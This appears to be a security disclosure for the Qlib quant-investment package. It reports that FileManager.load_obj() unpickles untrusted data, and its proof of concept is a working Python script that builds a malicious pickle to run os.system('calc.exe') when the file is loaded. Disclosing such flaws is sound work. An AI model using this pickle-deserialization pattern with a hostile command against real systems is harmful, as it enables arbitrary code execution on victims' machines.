## :writing_hand: Description

`Qlib` is an AI-oriented quantitative investment platform, which aims to realize the potential, empower the research, and create the value of AI technologies in quantitative investment. This package is vulnerable to `Arbitrary Code Execution`.

## :bug: Vulnerability

`load_obj()` is a method used by `FileManager` class for loading files to manage objects. It should only unpickle objects saved with `save_obj()` method.

## :male_detective: Proof of Concept

#### Installation
```bash
pip install pyqlib
```

#### Run exploit.py
```python
#!/usr/bin/env python3

import pickle
import os
from qlib.utils.objm import FileManager

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('calc.exe', ))

payload = pickle.dumps(EvilPickle())

with open('payload', 'wb') as f:
    f.write(payload)

fmanager = FileManager('')
fmanager.load_obj('payload')
```
